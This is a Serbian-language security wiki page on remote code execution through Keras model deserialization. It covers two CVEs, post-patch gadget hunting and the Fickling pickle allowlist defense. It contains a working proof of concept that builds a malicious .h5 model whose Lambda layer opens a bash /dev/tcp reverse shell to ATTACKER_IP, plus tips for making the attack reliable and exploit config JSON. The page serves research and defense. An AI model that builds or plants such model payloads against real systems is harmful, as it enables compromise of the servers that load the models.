# RCE pri deserijalizaciji Keras modela i potraga za gadget-ima

{{#include ../../banners/hacktricks-training.md}}

Ova stranica daje pregled praktičnih tehnika eksploatacije pipeline-a za deserijalizaciju Keras modela, objašnjava interne detalje izvornog .keras formata i površinu napada, i nudi istraživački alatni skup za pronalaženje ranjivosti u datotekama modela (MFV) i gadget-a koji ostaju dostupni nakon ispravki.

## Interni detalji .keras formata modela

Datoteka .keras je ZIP arhiva koja sadrži najmanje:<sup>[[1]](#references)</sup>
- metadata.json – opšte informacije (npr. verzija Keras-a)
- config.json – arhitektura modela (primarna površina napada)
- model.weights.h5 – težine u HDF5 formatu

config.json upravlja rekurzivnom deserijalizacijom: Keras uvozi module, razrešava klase/funkcije i rekonstruiše slojeve/objekte iz rečnika koje kontroliše napadač.<sup>[[1]](#references)</sup>

Primer isečka za objekat Dense sloja:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserializacija obavlja:<sup>[[1]](#references)</sup>
- Uvoz modula i razrešavanje simbola iz ključeva module/class_name
- Pozivanje from_config(...) ili konstruktora sa kwargs koje kontroliše napadač
- Rekurziju kroz ugnježdene objekte (aktivacije, inicijalizatori, ograničenja itd.)

Istorijski gledano, ovo je napadaču koji pravi config.json izlagalo tri primitiva:<sup>[[1]](#references)</sup>
- Kontrolu nad tim koji se moduli uvoze
- Kontrolu nad tim koje klase/funkcije se razrešavaju
- Kontrolu nad kwargs argumentima koji se prosleđuju konstruktorima/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Osnovni uzrok:
- Nasleđena Lambda deserijalizacija rekonstruisala je Python funkciju iz marshaled koda koji kontroliše napadač: `func_load()` dekodira payload iz base64 formata, poziva `marshal.loads()` i kreira `FunctionType`. Bajtkod rezultujuće funkcije izvršava se kada se Lambda pozove, a loaderi pre verzije 2.13 nisu sprovodili provere safe-mode režima za nasleđene formate.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

U nativnoj Keras v3 arhivi, Lambda funkcija je predstavljena objektom `__lambda__` čije polje `code` sadrži marshaled kod kodiran u base64 formatu:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Ublažavanje:
- Keras podrazumevano primenjuje `safe_mode=True` za izvorni Keras v3 format. Serijalizovane Python lambda funkcije u `Lambda` su blokirane, osim ako korisnik izričito ne isključi ovu zaštitu pomoću `safe_mode=False`; ova zaštita ne obuhvata na isti način legacy formate.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Napomene:
- Legacy formati (starija HDF5 čuvanja) ili starije baze koda možda ne primenjuju moderne provere, pa napadi u stilu „downgrade“ i dalje mogu da uspeju kada žrtve koriste starije učitavače.

## CVE-2025-1550 – Uvoz proizvoljnih modula u Keras 3.0.0–3.8.x

Osnovni uzrok:
- `_retrieve_class_or_fn` je koristio `importlib.import_module(module)` nad stringovima modula pod kontrolom napadača iz `config.json`.
- Uticaj: posebno napravljen `.keras` arhiv mogao je da navede `Model.load_model()` da uveze Python module i funkcije koje je izabrao napadač, uz neželjene efekte pri uvozu i argumente pod kontrolom napadača, čak i kada je `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ideja za eksploataciju:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Bezbednosna poboljšanja (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist modula: uvoz je ograničen na module zvaničnog ekosistema: keras, keras_hub, keras_cv, keras_nlp
- Podrazumevani bezbedni režim: safe_mode=True blokira nebezbedno učitavanje serijalizovanih funkcija Lambda
- Osnovna provera tipova: deserijalizovani objekti moraju da odgovaraju očekivanim tipovima

## Praktična eksploatacija: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Starije TensorFlow-Keras instalacije možda i dalje prihvataju HDF5 model fajlove (`.h5`). Ako napadač može da otpremi model koji server kasnije učitava ili nad njim izvršava inferenciju, ranjiv učitavač može da deserijalizuje Lambda sloj koji sadrži Python kod pod kontrolom napadača, a taj kod zatim može da se izvrši u okviru radnog procesa modela aplikacije.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimalni PoC za pravljenje zlonamernog .h5 fajla čiji Lambda izvršava reverse shell kada cilj pozove model:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Napomene i saveti za pouzdanost:
- Tačke aktiviranja zavise od formata i toka rada; u opisanom slučaju payload se izvršio dva puta tokom predikcije. Računajte na to da se neželjeni efekti mogu ponavljati i učinite payload idempotentnim.<sup>[[7]](#references)</sup>
- Zaključavanje verzija: koristite iste verzije TF/Keras/Python kao žrtva da biste izbegli nepodudaranja u serijalizaciji. Na primer, napravite artefakte u Python 3.8 okruženju sa TensorFlow 2.13.1 ako ih koristi cilj.<sup>[[7]](#references)</sup>
- Brza reprodukcija okruženja:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validacija: benigni payload poput `os.system("ping -c 1 YOUR_IP")` pomaže da se potvrdi izvršavanje (npr. posmatranjem ICMP-a pomoću `tcpdump`) pre prelaska na reverse shell.<sup>[[7]](#references)</sup>

## Površina gadgeta nakon ispravke unutar allowlist-a

Čak i uz Keras module allowlist i safe mode, dozvoljeni pozivi mogu da izazovu sporedne efekte. Na primer, `keras.utils.get_file` preuzima URL i upisuje ga na konfigurisanu lokaciju keša, što ga čini kandidatom za analizu gadgeta.<sup>[[1]](#references)[[19]](#references)</sup>

Primer Lambda konfiguracije (validirajte potpis poziva u kontrolisanom testu):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Važno ograničenje:
- `Lambda.call()` uvek prosleđuje ulaz modela kao prvi pozicioni argument, a konfigurisane `arguments` kao argumente po ključnim rečima. Za `get_file`, ta poziciona vrednost popunjava `fname`; nepodudaranje tensor/path može dovesti do toga da ovaj kandidat zakaže pre bilo kakvog preuzimanja, pa nije garantovano da će gadget raditi.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting pickle importova za ML modele (Fickling)

Mnogi formati AI/ML modela (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artefakti i drugi Python-native formati) sadrže Python pickle podatke. Gore opisani legacy Keras Lambda putanja umesto toga koristi marshal-ovan bytecode funkcija, pa predstavlja zaseban rizik deserializacije. Pickle opcodes mogu da pokrenu ponašanje koje kontroliše napadač tokom deserializacije, uključujući izmenu modela ili RCE, a jednostavni skeneri mogu da propuste nove ili nenavedene opasne importe.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Praktična fail-closed odbrana je da se zakači Python pickle deserializer i da se tokom unpickling-a dozvole samo provereni bezopasni importovi povezani sa ML-om. Fickling kompanije Trail of Bits primenjuje ovu politiku i isporučuje kuriranu allowlistu ML importova, sastavljenu na osnovu hiljada javnih Hugging Face pickle datoteka.<sup>[[8]](#references)[[13]](#references)</sup>

Bezbednosni model za „bezbedne“ importe (intuicije sažete iz istraživanja i prakse): simboli uvezeni pickle-om moraju istovremeno da ispunjavaju sledeće uslove:<sup>[[8]](#references)</sup>
- Ne izvršavaju kod niti izazivaju njegovo izvršavanje (nema kompajliranih/izvornih code objekata, pokretanja shell komandi, hook-ova itd.)
- Ne pribavljaju/ne menjaju proizvoljne atribute ili stavke
- Ne uvoze niti pribavljaju reference na druge Python objekte iz pickle VM-a
- Ne pokreću sekundarne deserializere (npr. marshal, ugnježdeni pickle), čak ni posredno

Omogućite Fickling zaštite što ranije pri pokretanju procesa, kako bi se proverila sva pickle učitavanja koja obavljaju framework-ovi (`torch.load`, `joblib.load` itd.):<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Operativni saveti:
- Možete privremeno onemogućiti/ponovo omogućiti hooks tamo gde je potrebno:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Ako je proveren model blokiran, proširite allowlist za svoje okruženje nakon što pregledate simbole:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling takođe nudi generičke runtime zaštite ako želite granularniju kontrolu:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() za sprovođenje provera za sve pickle.load()
  - with fickling.check_safety(): za sprovođenje provera u određenom opsegu
  - fickling.load(path) / fickling.is_likely_safe(path) za pojedinačne provere

- Kad god je moguće, dajte prednost formatima modela koji nisu pickle (npr. SafeTensors).<sup>[[15]](#references)</sup> Ako morate da prihvatate pickle, pokrećite učitavače uz najmanje moguće privilegije, bez izlaznog mrežnog saobraćaja, i sprovodite allowlist.

Ova strategija koja daje prednost allowlisti dokazano blokira uobičajene putanje eksploatacije ML pickle-a, uz visoku kompatibilnost. U ToB-ovom benchmarku, Fickling je označio 100% sintetičkih zlonamernih datoteka i dozvolio ~99% čistih datoteka iz vodećih Hugging Face repozitorijuma.<sup>[[8]](#references)[[10]](#references)</sup>


## Alatke za istraživače

1) Sistematsko otkrivanje gadžeta u dozvoljenim modulima

Nabrojte potencijalne pozive u keras, keras_nlp, keras_cv, keras_hub i dajte prednost onima koji imaju sporedne efekte nad datotekama/mrežom/procesima/okruženjem.<sup>[[1]](#references)</sup>

<details>
<summary>Nabrojte potencijalno opasne pozive u Keras modulima sa allowliste</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Direktno testiranje deserijalizacije (nije potreban .keras arhiv)

Prosledite pripremljene rečnike direktno Keras deserijalizatorima da biste saznali koje parametre prihvataju i uočili sporedne efekte.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Testiranje između verzija i formata

Keras postoji u više baza koda/generacija sa različitim zaštitnim mehanizmima i formatima:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (zastareli, planirano je uklanjanje)
- tf-keras: održava se zasebno
- Multi-backend Keras 3 (zvanični): uveden je izvorni .keras

Ponovite testove kroz različite baze koda i formate (.keras naspram legacy HDF5) da biste otkrili regresije ili nedostajuće zaštitne mehanizme.

## References

- [1] [Otkrivanje ranjivosti u Keras deserijalizaciji modela (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Dodate provere u serijalizaciju](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE putem Keras Lambda deserijalizacije](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Proizvoljan uvoz modula u Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr izveštaj – proizvoljan uvoz #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr izveštaj – proizvoljan uvoz #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE do root pristupa](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – novi Fickling skener AI/ML pickle datoteka](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Zaštita AI/ML okruženja (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Korpus za testiranje performansi pickle skeniranja u Fickling-u](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Pozadina Sleepy Pickle napada](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projekat SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda slojevi omogućavaju ubacivanje proizvoljnog koda](https://kb.cert.org/vuls/id/253266)
- [17] [Izvorni kod Keras Lambda sloja (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Izvorni kod Keras Python uslužnih funkcija (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
